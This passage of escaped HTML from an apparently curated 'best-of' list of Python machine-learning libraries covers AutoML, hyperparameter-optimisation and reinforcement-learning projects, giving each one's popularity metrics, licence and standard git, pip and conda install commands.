25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/shankarpandala/lazypredict&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lazypredict&#34;&gt;PyPi&lt;/a&gt; (📥 7.2K / month · ⏱️ 17.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lazypredict&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lazypredict&#34;&gt;Conda&lt;/a&gt; (📥 400 · ⏱️ 24.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lazypredict&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AutoViML/Auto_ViML&#34;&gt;Auto ViML&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 340) - Automatically Build Multiple ML Models with a Single Line of Code... &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/AutoViML/Auto_ViML&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 77 · 📦 16 · 📋 20 - 25% open · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/AutoViML/Auto_ViML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/autoviml&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 2 · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install autoviml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rsteca/sklearn-deap&#34;&gt;sklearn-deap&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 700 · 💤) - Use evolutionary algorithms instead of gridsearch in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rsteca/sklearn-deap&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 110 · 📦 31 · 📋 55 - 38% open · ⏱️ 30.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rsteca/sklearn-deap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sklearn-deap&#34;&gt;PyPi&lt;/a&gt; (📥 1.2K / month · 📦 2 · ⏱️ 30.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sklearn-deap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ScottfreeLLC/AlphaPy&#34;&gt;AlphaPy&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 780) - Automated Machine Learning [AutoML] with Python, scikit-learn, Keras,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ScottfreeLLC/AlphaPy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3 · 🔀 160 · 📦 3 · 📋 41 - 29% open · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ScottfreeLLC/AlphaPy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/alphapy&#34;&gt;PyPi&lt;/a&gt; (📥 81 / month · ⏱️ 29.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install alphapy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/model_search&#34;&gt;model_search&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 3.2K) - AutoML algorithms for model architecture search at scale. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/model_search&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1 · 🔀 360 · 📋 50 - 70% open · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/model_search&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 23 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EpistasisLab/tpot&#34;&gt;TPOT&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 8.6K) - A Python Automated Machine Learning tool that optimizes machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fmfn/BayesianOptimization&#34;&gt;Bayesian Optimization&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 6K · 💀) - A Python implementation of global optimization with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Epistimio/orion&#34;&gt;Orion&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 230) - Asynchronous Distributed Hyperparameter Optimization. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SheffieldML/GPyOpt&#34;&gt;GPyOpt&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 810 · 💀) - Gaussian Process Optimization using GPy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/automl/SMAC3&#34;&gt;SMAC3&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 700) - Sequential Model-based Algorithm Configuration. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSD-1-Clause&#34;&gt;❗️BSD-1-Clause&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ClimbsRocks/auto_ml&#34;&gt;auto_ml&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.6K · 💀) - [UNMAINTAINED] Automated machine learning for analytics &amp;amp; production. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AxeldeRomblay/MLBox&#34;&gt;MLBox&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.3K · 💀) - MLBox is a powerful Automated Machine Learning python library. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSD-1-Clause&#34;&gt;❗️BSD-1-Clause&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AutoViML/featurewiz&#34;&gt;featurewiz&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 230) - Use advanced feature engineering strategies and select best.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/claesenm/optunity&#34;&gt;optunity&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 390 · 💀) - optimization routines for hyperparameter tuning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/williamFalcon/test-tube&#34;&gt;Test Tube&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 720 · 💀) - Python library to easily log experiments and parallelize.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dragonfly/dragonfly&#34;&gt;Dragonfly&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 640 · 💀) - An open source python library for scalable Bayesian optimisation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/HDI-Project/ATM&#34;&gt;Auto Tune Models&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 520 · 💀) - Auto Tune Models - A multi-tenant, multi-data system for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sherpa-ai/sherpa&#34;&gt;Sherpa&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 310 · 💀) - Hyperparameter optimization that enables researchers to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tobegit3hub/advisor&#34;&gt;Advisor&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 1.5K · 💀) - Open-source implementation of Google Vizier for hyper parameters.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/reiinakano/xcessiv&#34;&gt;Xcessiv&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 1.3K · 💀) - A web-based application for quick, scalable, and automated.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/HunterMcGushion/hyperparameter_hunter&#34;&gt;HyperparameterHunter&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 690 · 💀) - Easy hyperparameter optimization and automatic result.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jmcarpenter2/parfit&#34;&gt;Parfit&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 200 · 💀) - A package for parallelizing the fit and flexibly scoring of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/minimaxir/automl-gs&#34;&gt;automl-gs&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 1.8K · 💀) - Provide an input CSV and a target field to predict, generate a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/carpedm20/ENAS-pytorch&#34;&gt;ENAS&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 2.6K · 💀) - PyTorch implementation of Efficient Neural Architecture Search via.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/LGE-ARC-AdvancedAI/auptimizer&#34;&gt;Auptimizer&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 180 · 💀) - An automatic ML model optimization tool. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/joeddav/devol&#34;&gt;Devol&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 940 · 💀) - Genetic neural architecture search with Keras. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/electricbrainio/hypermax&#34;&gt;Hypermax&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 100 · 💀) - Better, faster hyper-parameter optimization. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gdikov/hypertunity&#34;&gt;Hypertunity&lt;/a&gt;&lt;/b&gt; (🥉9 · ⭐ 120 · 💀) - A toolset for black-box hyperparameter optimisation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Reinforcement Learning&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for building and evaluating reinforcement learning &amp;amp; agent-based systems.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/openai/gym&#34;&gt;OpenAI Gym&lt;/a&gt;&lt;/b&gt; (🥇42 · ⭐ 28K) - A toolkit for developing and comparing reinforcement learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/openai/gym&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 360 · 🔀 7.8K · 📦 30K · 📋 1.7K - 6% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/openai/gym&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gym&#34;&gt;PyPi&lt;/a&gt; (📥 640K / month · 📦 2.4K · ⏱️ 14.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gym&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gym&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 08.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gym&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/agents&#34;&gt;TF-Agents&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 2.3K) - TF-Agents: A reliable, scalable and easy to use TensorFlow.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/agents&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 630 · 📦 800 · 📋 560 - 23% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/agents&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tf-agents&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 14 · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tf-agents&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AI4Finance-Foundation/FinRL&#34;&gt;FinRL&lt;/a&gt;&lt;/b&gt; (🥇30 · ⭐ 5K) - FinRL: The first open-source project for financial reinforcement learning... &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/AI4Finance-Foundation/FinRL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 64 · 🔀 1.2K · 📦 11 · 📋 400 - 13% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/AI4Finance-Foundation/FinRL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/finrl&#34;&gt;PyPi&lt;/a&gt; (📥 280 / month · ⏱️ 08.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install finrl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/dopamine&#34;&gt;Dopamine&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 9.8K) - Dopamine is a research framework for fast prototyping of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/dopamine&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 1.3K · 📋 170 - 51% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/dopamine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dopamine-rl&#34;&gt;PyPi&lt;/a&gt; (📥 46K / month · 📦 37 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dopamine-rl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/acme&#34;&gt;Acme&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.7K) - A library of reinforcement learning components and agents. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/acme&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 68 · 🔀 330 · 📦 78 · 📋 210 - 19% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/acme&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dm-acme&#34;&gt;PyPi&lt;/a&gt; (📥 3.7K / month · 📦 2 · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dm-acme&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dm-acme&#34;&gt;Conda&lt;/a&gt; (📥 2.3K · ⏱️ 09.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dm-acme&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mwydmuch/ViZDoom&#34;&gt;ViZDoom&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.4K) - Doom-based AI Research Platform for Reinforcement Learning from Raw.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mwydmuch/ViZDoom&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 47 · 🔀 340 · 📥 12K · 📦 140 · 📋 430 - 20% open · ⏱️ 07.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mwydmuch/ViZDoom&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vizdoom&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · 📦 14 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vizdoom&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorlayer/TensorLayer&#34;&gt;TensorLayer&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 7K) - Deep Learning and Reinforcement Learning Library for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorlayer/TensorLayer&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 1.6K · 📥 1.4K · 📋 470 - 5% open · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorlayer/tensorlayer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorlayer&#34;&gt;PyPi&lt;/a&gt; (📥 2.5K / month · 📦 40 · ⏱️ 15.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorlayer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PARL&#34;&gt;PARL&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2.6K) - A high-performance distributed training framework for Reinforcement.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PARL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 710 · 📦 91 · 📋 380 - 19% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PARL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/parl&#34;&gt;PyPi&lt;/a&gt; (📥 830 / month · 📦 1 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install parl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorforce/tensorforce&#34;&gt;TensorForce&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 3.1K) - Tensorforce: a TensorFlow library for applied.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorforce/tensorforce&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 82 · 🔀 520 · 📋 640 - 2% open · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorforce/tensorforce&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorforce&#34;&gt;PyPi&lt;/a&gt; (📥 1.8K / month · 📦 27 · ⏱️ 07.09.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorforce&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a 